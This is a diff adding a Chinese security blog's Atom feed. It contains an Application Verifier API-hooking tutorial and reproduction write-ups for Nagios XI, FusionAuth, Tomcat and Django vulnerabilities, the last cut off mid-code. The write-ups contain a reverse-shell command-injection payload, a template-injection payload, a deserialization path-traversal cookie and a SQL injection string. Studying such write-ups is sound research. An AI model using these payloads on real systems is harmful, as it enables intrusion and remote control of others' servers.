@@ -1,0 +1,1282 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://c0n6w3i.github.io/</id>
+    <title>Gridea</title>
+    <updated>2021-08-13T01:32:43.246Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://c0n6w3i.github.io/"/>
+    <link rel="self" href="https://c0n6w3i.github.io/atom.xml"/>
+    <subtitle>温故而知新</subtitle>
+    <logo>https://c0n6w3i.github.io/images/avatar.png</logo>
+    <icon>https://c0n6w3i.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2021, Gridea</rights>
+    <entry>
+        <title type="html"><![CDATA[使用Application verifier hook window API]]></title>
+        <id>https://c0n6w3i.github.io/post/shi-yong-application-verifier-hook-window-api/</id>
+        <link href="https://c0n6w3i.github.io/post/shi-yong-application-verifier-hook-window-api/">
+        </link>
+        <updated>2021-08-12T13:23:47.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="介绍">介绍</h2>
+<p>Windows 自带的 Applicaion verifier 原本是用来做软件诊断的, 其功能包括检测一些内存错误或者权限问题. 不过这玩意的厉害之处在于用户可以通过编写 dll 来 hook windows 底层API.</p>
+<p>关于如何使用 AppVerifier 我这里就不写了, 网上关于 AppVerifier 的教程基本都是介绍如何运行的.<br>
+这里重点谈论下如何编写和加载AVRF</p>
+<h2 id="avrf-流程">AVRF 流程</h2>
+<p>首先介绍下 AppVerifier 的执行流程:<br>
+当一个被标注的程序执行时, AppVerifier 会在程序启动时, 加载 NTDLL 之后开始加载一些 Verification Provider. 这些 Provider 来自一些 dll, 里面包含一些测试项. 加载完之后会执行 这些 DLL 中 VERIFIER_LOADED 里的内容.<br>
+本质上这里执行什么都行, 包括恶意代码. 不过 windows 开发人员也知道这一点, 所以加载自定义的 dll 需要 admin 权限修改注册表.<br>
+AppVerifier 会根据软件在 IFEO 里的 VerifierDLLs 或者 root IFEO 里的 ApplicationVerifierGlobalSettings 来加载 Provider.</p>
+<p>如果在 VERIFIER_LOADED 提供一个 PRTL_VERIFIER_PROVIDER_DESCRIPTOR, AppVerifier 就会根据 PRTL_VERIFIER_PROVIDER_DESCRIPTOR 的设定去 hook 指定的 function.</p>
+<h2 id="编写-dll">编写 DLL</h2>
+<p>和普通 DLL 的区别在于 Provider 使用 VERIFIER_LOADED. 这个 reason 指向 RTL_VERIFIER_PROFIDER_DESCRIPTION. 这就能让 provider 给其他 dll 注册 thunks.<br>
+这里给个简单的例子 hook MessageBoxW, 先把各种 struct 写在头文件里</p>
+<pre><code class="language-c">define DLL_PROCESS_VERIFIER 4
+
+typedef VOID (NTAPI * RTL_VERIFIER_DLL_LOAD_CALLBACK) (PWSTR DllName, PVOID DllBase, SIZE_T DllSize, PVOID Reserved);
+typedef VOID (NTAPI * RTL_VERIFIER_DLL_UNLOAD_CALLBACK) (PWSTR DllName, PVOID DllBase, SIZE_T DllSize, PVOID Reserved);
+typedef VOID (NTAPI * RTL_VERIFIER_NTDLLHEAPFREE_CALLBACK) (PVOID AllocationBase, SIZE_T AllocationSize);
+
+typedef struct _RTL_VERIFIER_THUNK_DESCRIPTOR
+{
+    PCHAR ThunkName;
+    PVOID ThunkOldAddress;
+    PVOID ThunkNewAddress;
+} RTL_VERIFIER_THUNK_DESCRIPTOR, *PRTL_VERIFIER_THUNK_DESCRIPTOR;
+
+typedef struct _RTL_VERIFIER_DLL_DESCRIPTOR
+{
+    PWCHAR DllName;
+    DWORD DllFlags;
+    PVOID DllAddress;
+    PRTL_VERIFIER_THUNK_DESCRIPTOR DllThunks;
+} RTL_VERIFIER_DLL_DESCRIPTOR, *PRTL_VERIFIER_DLL_DESCRIPTOR;
+
+typedef struct _RTL_VERIFIER_PROVIDER_DESCRIPTOR
+{
+    DWORD Length;
+    PRTL_VERIFIER_DLL_DESCRIPTOR ProviderDlls;
+    RTL_VERIFIER_DLL_LOAD_CALLBACK ProviderDllLoadCallback;
+    RTL_VERIFIER_DLL_UNLOAD_CALLBACK ProviderDllUnloadCallback;
+    PWSTR VerifierImage;
+    DWORD VerifierFlags;
+    DWORD VerifierDebug;
+    PVOID RtlpGetStackTraceAddress;
+    PVOID RtlpDebugPageHeapCreate;
+    PVOID RtlpDebugPageHeapDestroy;
+    RTL_VERIFIER_NTDLLHEAPFREE_CALLBACK ProviderNtdllHeapFreeCallback;
+} RTL_VERIFIER_PROVIDER_DESCRIPTOR, *PRTL_VERIFIER_PROVIDER_DESCRIPTOR;
+</code></pre>
+<p>在 RTL_VERIFIER_DLL_DESCRIPTOR 写入要 hook 的 function 所在的 dll. 这里用 user32.dll<br>
+在 dll 对应的 RTL_VERIFIER_THUNK_DESCRIPTOR 里写入要 hook 的 function 的名字. 这里写入 MessageBoxW. AVRF 会在相应 dll 里搜索这个 function 找到的话以后程序运行这个 function 就会先 运行 hook. 这里的 hook function 就是修改 lpText 然后执行原本的MessageBoxW.</p>
+<pre><code class="language-c">typedef int(__stdcall *g_MessageBoxW)(HWND, LPWSTR, LPWSTR, UINT);
+int WINAPI Hook(HWND hWnd, LPWSTR lpText, LPWSTR lpCaption, UINT uType);
+
+static RTL_VERIFIER_THUNK_DESCRIPTOR avrfThunks[] = {{&quot;MessageBoxW&quot;, NULL, (PVOID)(ULONG_PTR)Hook}, { 0 }};
+static RTL_VERIFIER_DLL_DESCRIPTOR avrfDlls[] = {{L&quot;user32.dll&quot;, 0, NULL, avrfThunks}, {NULL, 0, NULL, NULL}};
+static RTL_VERIFIER_PROVIDER_DESCRIPTOR avrfDescriptor = {sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR), avrfDlls};
+
+int WINAPI Hook(HWND hWnd, LPWSTR lpText, LPWSTR lpCaption, UINT uType)
+{
+	int res = ((g_MessageBoxW)avrfThunks[0].ThunkOldAddress)(hWnd, L&quot;test&quot;, lpText, uType);
+	return res;
+}
+</code></pre>
+<p>最后在 DLL_PROCESS_VERIFIER 里给 lpReserved 赋值.</p>
+<pre><code class="language-c">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
+{
+	switch (dwReason) 
+    {
+	case DLL_PROCESS_VERIFIER:
+		*(PRTL_VERIFIER_PROVIDER_DESCRIPTOR*)lpReserved = &amp;avrfDescriptor;
+		break;
+	}
+	return TRUE;
+}
+</code></pre>
+<h2 id="总结">总结</h2>
+<p>因为需要admin权限修改注册表所以很难利用, 不过要是能修改注册表的话可以使用此方法修改各种程序.</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2019-20197 Nagios XI RCE]]></title>
+        <id>https://c0n6w3i.github.io/post/cve-2019-20197-nagios-xi-rce/</id>
+        <link href="https://c0n6w3i.github.io/post/cve-2019-20197-nagios-xi-rce/">
+        </link>
+        <updated>2020-06-08T03:00:46.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="0x01-简介">0x01 简介</h2>
+<p>Nagios XI是一个网络监控软件.</p>
+<h2 id="0x02-漏洞概述">0x02 漏洞概述</h2>
+<p>这是一个字符串拼接的 RCE 漏洞, 问题出在 schedulereport.php 文件, 当用户创建或修改 schedule 时, 用户可以向id字段添加系统命令. 当schedule提交时, 系统会执行添加的命令.<br>
+因为只有 Nagios Core 开源, 又没有 schedulereport.php 源码, 所以没有源码分析.</p>
+<h2 id="0x03-影响版本">0x03 影响版本</h2>
+<p>Nagios XI &lt;= 5.6.9</p>
+<h2 id="0x04-环境搭建">0x04 环境搭建</h2>
+<p>本次使用 Nagios XI 5.6.1 进行测试</p>
+<ol>
+<li>先装个 <a href="https://www.linuxvmimages.com/images/centos-7/">CentOS 7 的虚拟机</a></li>
+<li>下载 <a href="https://www.nagios.com/downloads/nagios-xi/older-releases/">xi-5.6.1.tar.gz</a></li>
+<li>放到虚拟机里解压 <code>tar xzf xi-latest.tar.gz</code></li>
+<li>运行安装脚本 <code>./nagiosxi/fullinstall</code></li>
+<li>本人装了三个多小时, 装好了进入 <code>http://192.168.49.133/nagiosxi</code></li>
+<li>设置时间<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628565262.png" alt="" loading="lazy"></li>
+<li>设置用户<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628575295.png" alt="" loading="lazy"></li>
+<li>登陆, 然后进入主界面<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628583766.png" alt="" loading="lazy"><br>
+<img src="https://c0n6w3i.github.io//post-images/1591628614092.png" alt="" loading="lazy"></li>
+<li>在自己主机上开个端口,准备接 reverse shell<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628592753.png" alt="" loading="lazy"></li>
+</ol>
+<h2 id="0x05-漏洞复现">0x05 漏洞复现</h2>
+<ol>
+<li>进入 Schedule Page, 先随便建一个 schedule<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628622404.png" alt="" loading="lazy"></li>
+<li>然后 edit 这个 schedule</li>
+<li>开启 Burp Suit 抓包, 配置好 proxy<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628628912.png" alt="" loading="lazy"></li>
+<li>点击 Save, 然后去 Burp Suit 看抓包<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628636040.png" alt="" loading="lazy"></li>
+<li><code>id</code> 后面添加 payload <code>%22%3B%2fbin%2fbash%20-l%20%3E%20%2fdev%2ftcp%2f192.168.49.131%2f2333%200%3C%261%202%3E%261%3B</code><br>
+如果 <code>id=-1</code>的话要把 <code>id</code> 改成别的<br>
+payload 为<pre><code class="language-bash">&quot;;/bin/bash -l &gt; /dev/tcp/192.168.49.131/2333 0&lt;&amp;1 2&gt;&amp;1;
+</code></pre>
+测试时用的是<code>id=test%22%3B%2fbin%2fbash%20-l%20%3E%20%2fdev%2ftcp%2f192.168.49.131%2f2333%200%3C%261%202%3E%261%3B</code></li>
+<li>forward 之后拿到 shell 看结果<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628650348.png" alt="" loading="lazy"></li>
+</ol>
+<h2 id="0x06-修复方式">0x06 修复方式</h2>
+<p>官方建议升级到 Nagios XI 5.6.10 或更高的版本.</p>
+<h2 id="参考链接">参考链接：</h2>
+<p>https://nvd.nist.gov/vuln/detail/CVE-2019-20197<br>
+https://www.nagios.com/products/security/<br>
+https://code610.blogspot.com/2019/12/postauth-rce-in-latest-nagiosxi.html<br>
+https://s.tencent.com/research/bsafe/868.html</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2020-7799 FusionAuth RCE]]></title>
+        <id>https://c0n6w3i.github.io/post/cve-2020-7799-fusionauth-rce/</id>
+        <link href="https://c0n6w3i.github.io/post/cve-2020-7799-fusionauth-rce/">
+        </link>
+        <updated>2020-06-08T02:56:58.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="0x01-简介">0x01 简介</h2>
+<p>FusionAuth 是一个闭源的通用SSO解决方案</p>
+<h2 id="0x02-漏洞概述">0x02 漏洞概述</h2>
+<p>一个有修改 email 或者 theme 模板权限的用户可以通过使用 Apache FreeMarker engine 里的 freemarker.template.utility.Execute 来执行任意命令.<br>
+因为使用了Apache FreeMarker engine(freemarker-2.3.28.jar), 所以可以使用 freemarker 的语法, 类似 <code>${XXX? Built-ins}</code> 而 new 这个 Built-ins 会 创建一个特定 TemplateModel 的 变量. 要求<code>?</code>左边是 TemplateModel 也就是 freemarker.template.utility.Execute, 而右边就是 initialize 这个 object 时的参数.</p>
+<h2 id="0x03-影响版本">0x03 影响版本</h2>
+<p>FusionAuth &lt;= 1.11.0</p>
+<h2 id="0x04-环境搭建">0x04 环境搭建</h2>
+<p>本次使用 FusionAuth 1.10.0 进行测试</p>
+<ol>
+<li>下载 <a href="https://storage.googleapis.com/inversoft_products_j098230498/products/fusionauth/1.10.0/fusionauth-app-1.10.0.zip">FusionAuth 1.10.0</a></li>
+<li>将文件解压之后随便放一个位置</li>
+<li>启动 MySQL <code>/etc/init.d/mysql start</code></li>
+<li>启动 ElasticSearch <code>systemctl start elasticsearch.service</code></li>
+<li>启动 FusionAuth <code>bin/startup.sh</code><br>
+<img src="https://c0n6w3i.github.io//post-images/1591628282665.png" alt="" loading="lazy"></li>
+<li>打开网址<code>http://127.0.0.1:9011/</code>配置 FusionAuth
+<ol>
+<li>
+<p>先配置数据库<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628295841.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>配置 Elastic Search<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628304853.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>创建好用户之后就可以登录了<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628311685.png" alt="" loading="lazy"><br>
+<img src="https://c0n6w3i.github.io//post-images/1591628325556.png" alt="" loading="lazy"></p>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="0x05-漏洞复现">0x05 漏洞复现</h2>
+<p>本次使用 email template 进行测试</p>
+<ol>
+<li>进入 setting -&gt; email template<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628349900.png" alt="" loading="lazy"></li>
+<li>随便点一个 template 的 edit<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628394616.png" alt="" loading="lazy"></li>
+<li>开启 Burp Suit 抓包, 配置好 proxy<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628402122.png" alt="" loading="lazy"></li>
+<li>点击 Preview, 然后去 Burp Suit 看抓包<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628411177.png" alt="" loading="lazy"><br>
+<img src="https://c0n6w3i.github.io//post-images/1591628419953.png" alt="" loading="lazy"></li>
+<li>修改 <code>emailTemplate.defaultHtmlTemplate</code> 为 <code>${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;whoami&quot;)}</code></li>
+<li>forward 之后看结果<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628427868.png" alt="" loading="lazy"></li>
+</ol>
+<h2 id="0x06-修复方式">0x06 修复方式</h2>
+<p>值得一提的是 freemarker 2.3.19 的 changelog 里显示,如果用户开启了 TemplateClassResolver.SAFER_RESOLVER 的话, 可以防止创建 freemarker.template.utility.Execute. 然而目前这并不是默认配置.</p>
+<p>FusionAuth Version 1.11.0 的 release Note 里说是修改了 freemarker template engine, 使其不能执行恶意代码. 所以修复方式就是升级到1.11.0 及以后的版本.</p>
+<h2 id="参考链接">参考链接：</h2>
+<p>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7799<br>
+https://www.anquanke.com/post/id/198036</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2020-9484 Apache Tomcat 反序列化 RCE]]></title>
+        <id>https://c0n6w3i.github.io/post/cve-2020-9484-apache-tomcat-fan-xu-lie-hua-rce/</id>
+        <link href="https://c0n6w3i.github.io/post/cve-2020-9484-apache-tomcat-fan-xu-lie-hua-rce/">
+        </link>
+        <updated>2020-06-08T02:52:38.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="0x01-简介">0x01 简介</h2>
+<p>Tomcat是一个Java开发的web容器<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628093072.jpg" alt="" loading="lazy"></p>
+<h2 id="0x02-漏洞概述">0x02 漏洞概述</h2>
+<p>这次是因为错误配置和 org.apache.catalina.session.FileStore 的 LFI 和反序列化漏洞引起的 RCE. 当配置了 org.apache.catalina.session.PersistentManager 并且使用 org.apache.catalina.session.FileStore 来储存 session 时, 用户可以通过 org.apache.catalina.session.FileStore 的一个 LFI 漏洞来读取服务器上任意以 .session结尾的文件. 然后通过反序列化来运行 .session 文件.</p>
+<p>默认情况是使用 org.apache.catalina.session.StandardManager, 将 session储存到内存. 而 PersistentManager 会将不常用的 session swap out, 从而减少内存占用.</p>
+<p>此处使用 Tomcat 10.0.0-M4 来做分析</p>
+<p>这里主要是 FileStore 的 LFI 漏洞可以反序列化任意路径上的 .session 文件, 如果同时存在 文件上传漏洞的话就是 RCE 了.<br>
+首先看 FileStore 源码, 当用户请求里带有 JSESSIONID 时 会运行存在问题的 load 方法</p>
+<pre><code class="language-java">    public Session load(String id) throws ClassNotFoundException, IOException {
+        // Open an input stream to the specified pathname, if any
+        File file = file(id);
+        if (file == null || !file.exists()) {
+            return null;
+        }
+
+        Context context = getManager().getContext();
+        Log contextLog = context.getLogger();
+
+        if (contextLog.isDebugEnabled()) {
+            contextLog.debug(sm.getString(getStoreName()+&quot;.loading&quot;, id, file.getAbsolutePath()));
+        }
+
+        ClassLoader oldThreadContextCL = context.bind(Globals.IS_SECURITY_ENABLED, null);
+
+        try (FileInputStream fis = new FileInputStream(file.getAbsolutePath());
+                ObjectInputStream ois = getObjectInputStream(fis)) {
+
+            StandardSession session = (StandardSession) manager.createEmptySession();
+            session.readObjectData(ois);
+            session.setManager(manager);
+            return session;
+        } catch (FileNotFoundException e) {
+            if (contextLog.isDebugEnabled()) {
+                contextLog.debug(&quot;No persisted data file found&quot;);
+            }
+            return null;
+        } finally {
+            context.unbind(Globals.IS_SECURITY_ENABLED, oldThreadContextCL);
+        }
+    }
+</code></pre>
+<p>load 会先将 session id 转换成 file object 查看文件是否存在, 如果存在的话会读取文件. file object 会为输入的 id 添加<br>
+.session 后缀 然而并没有验证文件的目录</p>
+<pre><code class="language-java">    private File file(String id) throws IOException {
+        if (this.directory == null) {
+            return null;
+        }
+        String filename = id + FILE_EXT; 
+        File file = new File(directory(), filename);
+        return file;
+    }
+</code></pre>
+<p>当文件存在时, 系统会运行 org.apache.catalina.session.getObjectInputStream 方法</p>
+<pre><code class="language-java">    protected ObjectInputStream getObjectInputStream(InputStream is) throws IOException {
+        BufferedInputStream bis = new BufferedInputStream(is);
+
+        CustomObjectInputStream ois;
+        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+
+        if (manager instanceof ManagerBase) {
+            ManagerBase managerBase = (ManagerBase) manager;
+            ois = new CustomObjectInputStream(bis, classLoader, manager.getContext().getLogger(),
+                    managerBase.getSessionAttributeValueClassNamePattern(),
+                    managerBase.getWarnOnSessionAttributeFilterFailure());
+        } else {
+            ois = new CustomObjectInputStream(bis, classLoader);
+        }
+
+        return ois;
+    }
+</code></pre>
+<p>getObjectInputStream 方法运行 org.apache.catalina.util.CustomObjectInputStream 获取 gadget 类, 然后就反序列化session文件了.</p>
+<h2 id="0x03-影响版本">0x03 影响版本</h2>
+<p>Apache Tomcat: 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103</p>
+<h2 id="0x04-环境搭建">0x04 环境搭建</h2>
+<p>本次使用linux进行测试, 设置一个 Tomcat 服务</p>
+<ol>
+<li>下载 <a href="https://repo1.maven.org/maven2/org/apache/tomcat/tomcat/10.0.0-M4/">Tomcat 10.0.0-M4</a></li>
+<li>将文件解压之后放入 <code>/usr/local/tomcat</code></li>
+<li>修改 <code>/usr/local/tomcat/conf/context.xlm</code>, 添加 Manager</li>
+</ol>
+<pre><code class="language-xml">&lt;Context&gt;
+
+    &lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;
+    &lt;!-- web application will be reloaded.                                   --&gt;
+    &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;
+    &lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;
+    &lt;WatchedResource&gt;${catalina.base}/conf/web.xml&lt;/WatchedResource&gt;
+
+    &lt;!-- Uncomment this to enable session persistence across Tomcat restarts --&gt;
+    &lt;!--
+    &lt;Manager pathname=&quot;SESSIONS.ser&quot; /&gt;
+    --&gt;
+    &lt;Manager className=&quot;org.apache.catalina.session.PersistentManager&quot;&gt;
+            &lt;Store className=&quot;org.apache.catalina.session.FileStore&quot; directory=&quot;/tomcat/sessions/&quot;/&gt;
+    &lt;/Manager&gt;
+&lt;/Context&gt;
+</code></pre>
+<ul>
+<li>这个 directory 设置成什么都没有关系, 因为不过滤 <code>../</code></li>
+</ul>
+<ol start="4">
+<li>下载 <a href="https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9">groovy-2.3.9.jar</a></li>
+<li>将 groovy-2.3.9.jar 放入 <code>/usr/local/tomcat/lib</code></li>
+<li>执行 <code>/usr/local/tomcat/bin/catalina.sh start</code> 运行 Tomcat<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628114424.png" alt="" loading="lazy"></li>
+</ol>
+<h2 id="0x05-漏洞复现">0x05 漏洞复现</h2>
+<p>目标是在服务器上执行 <code>touch /tmp/2333</code> 假设 .session文件已经被上传到服务器的已知位置.</p>
+<ol>
+<li>下载 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 一个生成java反序列化 payload 的 .jar 包</li>
+<li>执行 <code>java -jar ysoserial-master-30099844c6-1.jar Groovy1 &quot;touch /tmp/2333&quot; &gt; /tmp/test.session</code> 生成 payload<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628167483.png" alt="" loading="lazy"></li>
+<li>执行 <code>curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../tmp/test'</code><br>
+<img src="https://c0n6w3i.github.io//post-images/1591628176551.png" alt="" loading="lazy"><br>
+虽然有报错但是反序列化已经执行了</li>
+<li>执行 <code>ls /tmp</code> 查看结果<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628183305.png" alt="" loading="lazy"></li>
+</ol>
+<h2 id="0x06-修复方式">0x06 修复方式</h2>
+<p>对比 Tomcat 10.0.0-M4 和 Tomcat 10.0.0-M5 的 FileStore 源码可以发现做了目录验证<br>
+<img src="https://c0n6w3i.github.io//post-images/1591628193945.png" alt="" loading="lazy"></p>
+<p>修复方式就是升级,或者配置WAF, 过滤掉<code>../</code>之类的字符串, 或者不使用 FileStore</p>
+<h2 id="参考链接">参考链接:</h2>
+<p>https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/<br>
+https://y4er.com/post/cve-2020-9484-tomcat-session-rce/#%E5%88%86%E6%9E%90<br>
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484<br>
+https://github.com/masahiro331/CVE-2020-9484</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2020-7471 漏洞分析笔记]]></title>
+        <id>https://c0n6w3i.github.io/post/cve-2020-7471-lou-dong-fen-xi-bi-ji/</id>
+        <link href="https://c0n6w3i.github.io/post/cve-2020-7471-lou-dong-fen-xi-bi-ji/">
+        </link>
+        <updated>2020-06-08T02:49:24.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="0x01-简介">0x01 简介</h2>
+<p>Django 是一个常用的 python web 服务框架.</p>
+<h2 id="0x02-漏洞概述">0x02 漏洞概述</h2>
+<p>这次是由于 Django 没有过滤输入而引起的 SQL 注入漏洞, 漏洞位置是在 <code>contrib.postgres.aggregates.StringAgg</code> 函数的 delimiter.</p>
+<p>这个函数对应 postgreSQL 里的 STRING_AGG 函数, 第三个参数(delimiter) 是注入点.</p>
+<p>举个例子：</p>
+<pre><code class="language-python">    results = Question.objects.all().values('text_1').annotate(test=StringAgg('text_2', delimiter=&quot;-&quot;))
+</code></pre>
+<p>这么一个操作会生成这样一个SQL query:</p>
+<pre><code class="language-sql">SELECT &quot;polls_question&quot;.&quot;text_1&quot;, STRING_AGG(&quot;polls_question&quot;.&quot;text_2&quot;, '-') AS &quot;test&quot; FROM &quot;polls_question&quot; GROUP BY &quot;polls_question&quot;.&quot;text_1&quot;
+</code></pre>
+<p>这时把 <code>'-'</code> 替换成 要注入的语句就行了, 此处是获取数据库版本信息</p>
+<pre><code class="language-sql">SELECT &quot;polls_question&quot;.&quot;text_1&quot;, STRING_AGG(&quot;polls_question&quot;.&quot;text_2&quot;, '-\') FROM (SELECT  text_1, version() AS text_2 FROM &quot;polls_question&quot;) AS polls_question GROUP BY &quot;polls_question&quot;.&quot;text_1&quot; -- \') AS &quot;test&quot; FROM &quot;polls_question&quot; GROUP BY &quot;polls_question&quot;.&quot;text_1&quot;
+</code></pre>
+<p>首先,作为漏洞的切入点, 系统会先 initialize 一个 StringAgg Object.</p>
+<pre><code class="language-python">class StringAgg(OrderableAggMixin, Aggregate):
+    function = 'STRING_AGG'
+    template = &quot;%(function)s(%(distinct)s%(expressions)s, '%(delimiter)s'%(ordering)s)&quot;
+    allow_distinct = True
+
+    def __init__(self, expression, delimiter, **extra):
+        super().__init__(expression, delimiter=delimiter, **extra)
+
+    def convert_value(self, value, expression, connection):
+        if not value:
+            return ''
+        return value
+</code></pre>
+<p>然后运行 query.annotate 函数</p>
+<pre><code class="language-python">    def annotate(self, *args, **kwargs):
+        &quot;&quot;&quot;
+        Return a query set in which the returned objects have been annotated
+        with extra data or aggregations.
+        &quot;&quot;&quot;
+</code></pre>
+<p>经过一堆验证和生成 group by 之类的操作之后, query 就算是生成好了</p>
+<p>获取 result 的时候直接执行 fetch_all 函数</p>
+<p>之后经过一些跳转, 执行 result_iter 函数</p>
+<pre><code class="language-python">class ValuesIterable(BaseIterable):
+    &quot;&quot;&quot;
+    Iterable returned by QuerySet.values() that yields a dict for each row.
+    &quot;&quot;&quot;
+    def __iter__(self):
+        queryset = self.queryset
+        query = queryset.query
+        compiler = query.get_compiler(queryset.db)
+        # extra(select=...) cols are always at the start of the row.
+        names = [
+            *query.extra_select,
+            *query.values_select,
+            *query.annotation_select,
+        ]
+        indexes = range(len(names))
+        for row in compiler.results_iter(chunked_fetch=self.chunked_fetch, chunk_size=self.chunk_size):
+            yield {names[i]: row[i] for i in indexes}
+</code></pre>
+<p>这之后会再 <code>compiler.py</code> 里执行一堆用于拼接 sql query 的函数<br>
+当执行完as_sql 函数时sql就生成完了. 最后在 execute_sql 函数中执行 sql</p>
+<pre><code class="language-python">def execute_sql(self, result_type=MULTI, chunked_fetch=False, chunk_size=GET_ITERATOR_CHUNK_SIZE):
+        &quot;&quot;&quot;
+        Run the query against the database and return the result(s). The
+        return value is a single data item if result_type is SINGLE, or an
+        iterator over the results if the result_type is MULTI.
+
+        result_type is either MULTI (use fetchmany() to retrieve all rows),
+        SINGLE (only retrieve a single row), or None. In this last case, the
+        cursor is returned if any query is executed, since it's used by
+        subclasses such as InsertQuery). It's possible, however, that no query
+        is needed, as the filters describe an empty set. In that case, None is
+        returned, to avoid any unnecessary database interaction.
+        &quot;&quot;&quot;
+        result_type = result_type or NO_RESULTS
+        try:
+            sql, params = self.as_sql()
+            if not sql:
+                raise EmptyResultSet
+        except EmptyResultSet:
+            if result_type == MULTI:
+                return iter([])
+            else:
+                return
+        if chunked_fetch:
+            cursor = self.connection.chunked_cursor()
+        else:
+            cursor = self.connection.cursor()
+        try:
+            cursor.execute(sql, params)
+        except Exception:
+            # Might fail for server-side cursors (e.g. connection closed)
+            cursor.close()
+            raise
+
+        if result_type == CURSOR:
+            # Give the caller the cursor to process and close.
+            return cursor
+        if result_type == SINGLE:
+            try:
+                val = cursor.fetchone()
+                if val:
+                    return val[0:self.col_count]
+                return val
+            finally:
+                # done with the cursor
+                cursor.close()
+
+</code></pre>
+<h2 id="0x03-影响版本">0x03 影响版本</h2>
+<p>Django 1.11 before 1.11.28, 2.2 before 2.2.10, and 3.0 before 3.0.3</p>
+<h2 id="0x04-环境搭建">0x04 环境搭建</h2>
+<p>简单来说就是搭建一个 Django 服务和一个 PostgreSQL 数据库.<br>
+Django 版本是 3.0.2<br>
+<code>pip install django==3.0.2</code><br>
+此处 Django 服务是直接照着<a href="https://docs.djangoproject.com/en/3.0/intro/tutorial01/">官方文档</a>搭建的.<br>
+数据库是直接从<a href="https://www.postgresql.org/">官网</a>上下载的</p>
+<p>因为大部分文件都是靠 Django 生成的,所以这里就直接把环境放到 <a href="https://github.com/C0n6w3i/Django-Notes">github</a> 上了.<br>
+运行前修改下 <code>settings.py</code> 里面 Database 配置就行<br>
+先启动 PostgreSQL 服务<br>
+然后再运行<br>
+下载好之后运行这几个命令初始化数据库之类的</p>
+<pre><code class="language-bash">python manage.py migrate
+python manage.py makemigrations polls
+python manage.py sqlmigrate polls 0001
+python manage.py migrate
+</code></pre>
+<h2 id="0x05-漏洞复现">0x05 漏洞复现</h2>
+<p>这里就随便写一个,用的是 URL 提交参数</p>
+<pre><code class="language-python">def index(request, payload):
+    # payload = &quot;-&quot;
+    # payload = '-\') FROM (SELECT text_1, version() AS text_2 FROM &quot;polls_question&quot;) AS polls_question GROUP BY &quot;polls_question&quot;.&quot;text_1&quot; -- '
+    results = Question.objects.all().values('text_1').annotate(test=StringAgg('text_2', delimiter=payload))
+    res = &quot;&quot;
+    for e in results:
+        res += str(e) + &quot;\n&quot;
+    return HttpResponse(&quot;Payload is : &quot; + payload + &quot;\nResult is : &quot; + res, content_type=&quot;text/plain&quot;)
+</code></pre>
+<p>执行 Django 服务：<br>
+<img src="https://c0n6w3i.github.io//post-images/1591627868451.png" alt="" loading="lazy"><br>
+然后去 <code>http://127.0.0.1:8000/polls/-</code><br>
+<img src="https://c0n6w3i.github.io//post-images/1591627894827.png" alt="" loading="lazy"></p>
+<p>执行注入 <code>http://127.0.0.1:8000/polls/-')%20FROM%20(SELECT%20text_1,%20version()%20AS%20text_2%20FROM%20%22polls_question%22)%20AS%20polls_question%20GROUP%20BY%20%22polls_question%22.%22text_1%22%20--</code><br>
+<img src="https://c0n6w3i.github.io//post-images/1591627911892.png" alt="" loading="lazy"></p>
+<h2 id="0x06-修复方式">0x06 修复方式</h2>
+<p>虽说 SQL prepared statement 可以完美防止 SQL 注入, 但是这种添加 function 的场景太过复杂,所以 Django 是用 Value函数来对 delimiter 进行过滤.<br>
+这是新版 StringAgg</p>
+<pre><code class="language-python">class StringAgg(OrderableAggMixin, Aggregate):
+    function = 'STRING_AGG'
